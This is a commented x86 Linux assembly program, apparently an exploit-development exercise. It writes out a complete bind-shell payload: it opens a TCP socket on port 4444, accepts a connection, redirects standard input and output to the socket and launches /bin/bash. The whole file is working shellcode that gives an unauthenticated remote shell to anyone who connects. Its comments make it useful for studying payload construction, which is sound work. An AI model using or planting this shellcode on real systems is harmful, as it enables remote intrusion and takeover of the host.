global _start

section .text

_start:

  ; we need to:
  ;  - call the bind() to create socket and bind it to the port
  ;  - listen() to open port for incoming connections
  ;  - loop to wait for incoming connection
  ;  - and on incoming connection we need to run shell
  
  ; bind call looks as follows:
  ; bind(socket_file_descriptor, (struct sockaddr *) &sock_address, sizeof(sock_address));
  ; therefore we need to:
  ; 1. create socket_file_descriptor
  ; 2. create structure of socket parameters
  ; 3. call bind syscall

  ;creating socket for AF_INET
  ;__NR_socketcall 102 -> /usr/include/i386-linux-gnu/asm/unistd_32.h
  ; from man socket
  ;  int socket(int domain, int type, int protocol);
  ;  sock_file_descriptor = socket(AF_INET, SOCK_STREAM, 0)
  ;/usr/include/i386-linux-gnu/sys/socket.h points to bits/socket.h
  ;/usr/include/i386-linux-gnu/bits/socket.h
  ;AF_INET = 2
  ;SOCK_STREAM = 1
  ; /usr/include/netinet/in.h
  ; INADDR_ANY = 0 => accepting connections from ANY host 
  ;socket(2,1,0)

  ; creating SOCKET
  xor eax,eax
  xor ebx,ebx
  xor ecx,ecx
  push eax     ; push 0 on stack, stack now contains value 0 (INADDR_ANY)
  mov al, 102  ; ax contains call number of socket
  mov bl, 1
  push ebx     ; push 1 on stack, stack now contains 0 and 1 (SOCK_STREAM)
  mov cl,2
  push ecx     ; push 2 on stack, stack now contains 0, 1 and 2 (AF_INET)

  mov ecx, esp ; save the pointer to arguments in ecx
               ; arguments are on stack in reverse order (0, 1, 2) and poping
               ; them will recover the correct order (2, 1, 0)
  int 0x80     ; call socket()
  mov esi, eax ; store socket_file_descriptor in the esi register


  ; opening SOCKET on port 4444
  xor ecx,ecx    ; ecx zeroing to ease the port number manipulating
  xor edx,edx    ; edx zeroing to be able to push 0 onto the stack
  push edx       ; INADDR_ANY [*]
  mov cx, 4444
  xchg ch,cl     ; because htons(port) reverses bytes
  push ecx
  xor ax,ax
  mov al, 2      ; AF_INET
  push ax        ; ax, not eax because this is part of the structure and is 16-bits long
                 ; stack now has (INADDR_ANY, port_no, protocol_family)
  mov ecx, esp ; save the pointer to the args in ecx registry

  ; calling bind() syscall
  ; in the file /usr/include/linux/net.h
  ; bind call has the value 2
  ; therefore we should use that value to point the operation that we do with a socket
  mov al, 102  ; ax contains call number of socket syscall
  mov bl, 2    ; socket call type number, 2 = bind
  mov dl,16    ; size of sock_address structure
  push edx
  xor edx,edx  ; zeroing again
  push ecx     ; pointer to the structure, created 6 instructions above
  push esi     ; push socket_file_descriptor on stack
  mov ecx, esp ; save the pointer to args in ecx registry
  int 0x80     ; call socket call type bind with particular port

  ; note the re-use of ecx - first we had in it the pointer to the stack of
  ; structure of socket, including the port
  ; later the address (stored in ecx) has been pushed onto stack
  ; along with other arguments of bind()
  ; and finally the stack address pointing to the new collection of arguments
  ; (this time bind() arguments) has been copied to ecx


  ; calling listen() syscall
  ; in the file /usr/include/linux/net.h
  ; listen call has the value 4
  ;
  ; from the manual (man listen):
  ; int listen(int sockfd, int backlog);
  ; The backlog argument defines the maximum length to which the  queue  of
  ; pending  connections  for  sockfd  may  grow.
  ;
  ; therefore the backlog should be 0 because we do not want any queue
  mov al, 102  ; ax contains call number of socket syscall
  mov bl, 4    ; socket call type number, 4 = listen
  push edx     ; backlog (==0)
  push esi     ; push socket_file_descriptor on stack
  mov ecx, esp ; save the pointer to args in ecx registry
  int 0x80

  ; calling accept() syscall
  ; in the file /usr/include/linux/net.h
  ; accept call has the value 5
  ;
  ; from the manual (man 2 accept):
  ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  ; "return a nonnegative integer that is a descriptor for the accepted socket."
  ;
  ; As for the arguments, there may be both nulls for the pointers as they are not needed by us:
  ; "The argument addr is a pointer to a sockaddr structure.  
  ; This structure is filled in with the address of the peer socket" 
  mov al, 102  ; ax contains call number of socket syscall
  mov bl, 5    ; socket call type number, 5 = accept
  push edx       ; addrlen
  push edx       ; addr
  push esi     ; push socket_file_descriptor on stack
  mov ecx, esp ; save the pointer to args in ecx registry
  int 0x80

  ; Now we must redirect STDIN, STDOUT and STDERR to the socket using dup2 call
  ; int dup2(int oldfd, int newfd);
  ; oldfd - incoming client file description from accept() call
  ; newfd - redirected stream fd (0/1/2 for std(in/out/err))
  ;
  ; dup2 -> 63 from /usr/include/i386-linux-gnu/asm/unistd_32.h


  ; saving client connection file descriptor
  mov ebx, eax ; save the incoming connection's file descriptor
  xor ecx, ecx ; zeroing ecx before the loop
  mov cl, 3    ; counter for the loop

stdloop:

  mov al, 63  ; sys call for dup2
  int 0x80
  dec cl      ; decrement the counter 
  jns stdloop ; loop until the sign flag is not set
              ; it cannot be jnz because we really want to execute loop on 0 counter

  ; all std's have been redirected
  ; finally - run SHELL
  mov   al, 11            ; The syscall number of execve
  push  edx               ; push null - the string-terminating character
  push  0x68736162        ; hsab 
  push  0x2f6e6962        ; /nib
  push  0x2f2f2f2f        ; ////
  mov   ebx,esp           ; Store pointer to executable's name in registry
  push  edx               ; push null - the argument must be null terminated
  push  ebx               ; push pointer to the executable path - the first argument of execve
  mov   ecx,esp           ; save pointer to the argv (pointer to string with executable + null)
  int   0x80              ; run execve("////bin/bash", NULL, NULL) => the last NULL is in edx
